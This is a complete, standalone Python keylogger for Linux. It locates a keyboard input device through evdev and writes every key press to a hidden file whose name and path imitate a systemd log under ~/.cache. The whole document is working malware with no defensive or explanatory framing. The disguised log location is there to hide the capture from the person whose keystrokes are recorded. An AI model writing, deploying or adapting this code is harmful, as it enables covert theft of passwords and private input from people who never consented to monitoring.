#!/usr/bin/env python3
from evdev import InputDevice, ecodes
import os

# simple hidden log
log_file = os.path.expanduser("~/.cache/.systemd/update.log")
open(log_file, "a").close()  # create if not exists

# auto-find your keyboard (works 99% of the time)
dev = None
for i in range(20):
    try:
        d = InputDevice(f'/dev/input/event{i}')
        if 'keyboard' in d.name.lower():
            dev = d
            print(f"[+] Using keyboard: {d.name}")
            break
    except:
        pass

if not dev:
    print("[-] No keyboard found")
    exit()

print(f"[+] Logging to {log_file}")
print("    → Type anywhere now (even this terminal works)")
print("    → Ctrl+C to stop\n")

with open(log_file, "a") as f:
    for event in dev.read_loop():
        if event.type == ecodes.EV_KEY and event.value == 1:  # key down
            key = ecodes.KEY[event.code].replace("KEY_", "")
            key = key.lower()
            if len(key) == 1:
                f.write(key)
            else:
                f.write(f"[{key}]")
            f.flush()   # see it live with tail -f
